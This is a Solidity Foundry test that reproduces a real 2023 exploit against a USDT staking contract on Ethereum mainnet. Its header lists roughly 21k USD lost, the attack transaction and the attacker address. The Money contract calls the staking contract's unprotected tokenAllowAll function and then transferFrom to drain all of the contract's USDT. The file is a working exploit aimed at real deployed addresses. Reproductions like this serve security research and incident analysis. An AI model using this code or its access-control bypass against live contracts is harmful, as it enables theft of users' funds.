// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~20999 USD
// TX : https://app.blocksec.com/explorer/tx/eth/0xfc872bf5ca8f04b18b82041ec563e4abf2e31e1fc27d1ea5dee39bc8a79d2d06
// Attacker : https://etherscan.io/address/0x000000915f1b10b0ef5c4efe696ab65f13f36e74
// Attack Contract : https://etherscan.io/address/0xb754ebdba9b009113b4cf445a7cb0fc9227648ad
// GUY : https://x.com/DecurityHQ/status/1680117291013267456


interface USDTStakingContract28 {
        function tokenAllowAll(address asset, address allowee) external; 
}
interface CheatCodesNew {
    /// Creates and also selects new fork with the given endpoint and at the block the given transaction was mined in,
    /// replays all transaction mined in the block before the transaction, returns the identifier of the fork.
    function createSelectFork(string calldata urlOrAlias, bytes32 txHash) external returns (uint256 forkId);
}
contract ContractTest is Test {
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    USDTStakingContract28 Stake=USDTStakingContract28(0x800cfD4A2ba8CE93eA2cc814Fce26c3635169017);
    Money money;
    function setUp() public {
        cheats.createSelectFork("mainnet", 17696562);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Begin] Attacker USDT balance before exploit", USDT.balanceOf(address(this)), 6);
        money=new Money();
        money.attack();
        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals());
    }

    fallback() external payable{}

}

contract Money {
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    USDTStakingContract28 Stake=USDTStakingContract28(0x800cfD4A2ba8CE93eA2cc814Fce26c3635169017);
    address owner;

    constructor() {
        owner = msg.sender;
    }

    function attack() public {
        Stake.tokenAllowAll(address(USDT), address(this));
        address(USDT).call(abi.encodeWithSelector(bytes4(0x23b872dd), address(Stake),address(msg.sender),USDT.balanceOf(address(Stake))));
    }


}